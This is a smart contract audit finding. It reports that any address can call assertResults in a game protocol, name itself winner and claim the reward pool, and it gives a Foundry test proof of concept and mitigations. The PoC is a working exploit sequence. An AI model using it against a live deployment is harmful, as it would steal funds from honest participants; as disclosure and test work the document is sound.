### [High] Non-Participative Address Can Assert Results and Claim Unjustified Rewards

**Description:**

The protocol allows any address to call the `assertResults` function, regardless of whether they participated in the game session. As demonstrated in the `test_anybodyCanAssertResults` test, a non-participative address (i.e., an address that did not answer any questions or fulfill the requirements to be a legitimate contestant) can assert itself as a winner when publishing results. This address can then claim rewards intended for actual game participants, bypassing the intended fairness and integrity of the protocol.

While the protocol relies on an optimistic oracle to validate the published results, this mechanism only provides a window for disputes. If no one appeals the result or if the oracle is not properly incentivized to challenge fraudulent assertions, the attacker can successfully claim unjustified rewards.

**Impact:**

- **Unjustified Reward Claim:** Malicious actors can claim rewards without participating in the game, leading to theft of funds from the reward pool.
- **Loss of Trust:** Legitimate users may lose confidence in the protocol due to the possibility of reward manipulation and unfair outcomes.
- **Economic Exploit:** The protocol’s reward distribution mechanism can be abused, resulting in financial loss for honest participants and sponsors.
- **Reliance on Oracle Appeals:** The protocol depends on external parties to monitor and dispute fraudulent results, which may not always be effective or timely.

**Proof of Concept:**\
Add the following import and test to `test/e2e/FullGameTest.t.sol`
<details><summary>PoC</summary>

```solidity
function test_anybodyCanAssertResults() public {
    // join a address to the game that not will be participative on it
    address alice = makeAddr("alice");
    vm.startPrank(alice);
    TestUSDC(usdc).mint(alice, 10 ether);
    TestUSDC(usdc).approve(address(sessionManager), 10 ether);
    sessionManager.joinGame(gameId);
    vm.stopPrank();

    // Join game with other 3 contestants
    for (uint256 i = 0; i < 3; i++) {
        vm.startPrank(contestants[i]);
        TestUSDC(usdc).approve(address(sessionManager), 10 ether);
        sessionManager.joinGame(gameId);
        vm.stopPrank();
    }

    // Move to game start time
    vm.warp(sessionManager.getStartTime(gameId));

    vm.prank(creator);
    // Start game and reveal first question
    uint256 questionId = 0;
    sessionManager.startAndRevealGameQuestion(gameId, questionId, q1Encoded, questionSalts[0]);

    // Contestants answer first question
    for (uint256 i = 0; i < 3; i++) {
        vm.startPrank(contestants[i]);
        uint16 choice = uint16(1);
        userReactions[i][0] = abi.encode(choice);
        sessionManager.commitReaction(
            gameId, questionId, keccak256(abi.encodePacked(gameId, questionId, choice, userSalts[i]))
        );
        vm.stopPrank();
        vm.warp(vm.getBlockTimestamp() + 1 seconds);
    }

    // Reveal second question
    vm.prank(creator);
    questionId = 1;
    sessionManager.revealGameQuestion(gameId, questionId, q2Encoded, questionSalts[1]);

    // Contestants answer second question
    for (uint256 i = 0; i < 3; i++) {
        vm.startPrank(contestants[i]);
        uint16 choice = uint16(i % 2);
        userReactions[i][1] = abi.encode(choice);
        sessionManager.commitReaction(
            gameId, questionId, keccak256(abi.encodePacked(gameId, questionId, choice, userSalts[i]))
        );
        vm.stopPrank();
        vm.warp(vm.getBlockTimestamp() + 1 seconds);
    }

    // Reveal third question
    vm.prank(creator);
    questionId = 2;
    sessionManager.revealGameQuestion(gameId, questionId, q3Encoded, questionSalts[2]);

    // Contestants answer third question
    for (uint256 i = 0; i < 3; i++) {
        vm.startPrank(contestants[i]);
        // Each contestant gives different probability
        bool answer = i % 2 == 0; // Alternating true/false
        int16 probability = int16(int256(5000 + (i * 1000))); // 50%, 60%, 70%
        userReactions[i][2] = abi.encode(answer, probability);
        sessionManager.commitReaction(
            gameId, questionId, keccak256(abi.encodePacked(gameId, questionId, answer, probability, userSalts[i]))
        );
        vm.stopPrank();
        vm.warp(vm.getBlockTimestamp() + 1 seconds);
    }

    // Reveal fourth question
    vm.prank(creator);
    questionId = 3;
    sessionManager.revealGameQuestion(gameId, questionId, q4Encoded, questionSalts[3]);

    // Contestants answer fourth question
    for (uint256 i = 0; i < 3; i++) {
        vm.startPrank(contestants[i]);
        // Each contestant gives different probability
        bool answer = i % 2 == 1; // Alternating false/true
        int16 probability = int16(int256(6000 + (i * 1000))); // 60%, 70%, 80%
        userReactions[i][3] = abi.encode(answer, probability);
        sessionManager.commitReaction(
            gameId, questionId, keccak256(abi.encodePacked(gameId, questionId, answer, probability, userSalts[i]))
        );
        vm.stopPrank();
        vm.warp(vm.getBlockTimestamp() + 1 seconds);
    }

    // The contestants finally reveal his reactions
    for (uint256 i = 0; i < 3; i++) {
        vm.startPrank(contestants[i]);
        sessionManager.revealReactions(
            gameId,
            Solarray.uint256s(0, 1, 2, 3),
            Solarray.bytess(userReactions[i][0], userReactions[i][1], userReactions[i][2], userReactions[i][3]),
            userSalts[i]
        );
        vm.stopPrank();
    }

    // Move to game end time
    vm.warp(sessionManager.getEndTime(gameId));

    // End game
    vm.prank(creator);
    sessionManager.endGame(gameId);

    vm.mockCall(
        address(optimisticOracle), abi.encodeCall(OptimisticOracleV3Interface.getMinimumBond, (usdc)), abi.encode(0)
    );
    vm.mockCall(
        address(optimisticOracle),
        abi.encodeWithSelector(OptimisticOracleV3Interface.assertTruth.selector),
        abi.encode(bytes32(0))
    );

    // A "non participative address" can assert the results an also can postulate itmself for winner
    vm.prank(alice);
    bytes32 assertionId = ISessionStrategy(sessionStrategy).assertResults(
        gameId,
        "ipfs address of all results",
        // An also can postulate itmself for winner
        Solarray.addresses(alice),
        Solarray.uint256s(374),
        Solarray.uint256s(8),
        Solarray.bytess(abi.encode(true), abi.encode(false), abi.encode(true), abi.encode(false))
    );

    // optimistic oracle sets the assertion to true after the dispute period
    vm.prank(optimisticOracle);
    SessionResultAsserter(sessionStrategy).assertionResolvedCallback(assertionId, true);

    // The game can be concluded without any issues
    vm.prank(creator);
    sessionManager.concludeGame(gameId);

    uint256 prevBalance = TestUSDC(usdc).balanceOf(alice);

    uint256 rewards = sessionManager.getRewards(gameId);

    (uint256 position,,) = ISessionStrategy(sessionStrategy).userResult(gameId, alice);

    vm.prank(alice);
    sessionManager.claimRewards(gameId, position - 1);

    // the "non participative address" can receive the rewards
    assertEq(TestUSDC(usdc).balanceOf(alice), prevBalance + rewards);
}
```
</details>

**Recommended Mitigation:**

- Restrict the ability to call `assertResults` to authorized roles (e.g., only the game creator or protocol admin).
- Implement checks to ensure only legitimate participants can be included as winners in the results assertion.
- Add validation in the reward claiming logic to verify actual participation before allowing reward withdrawal.
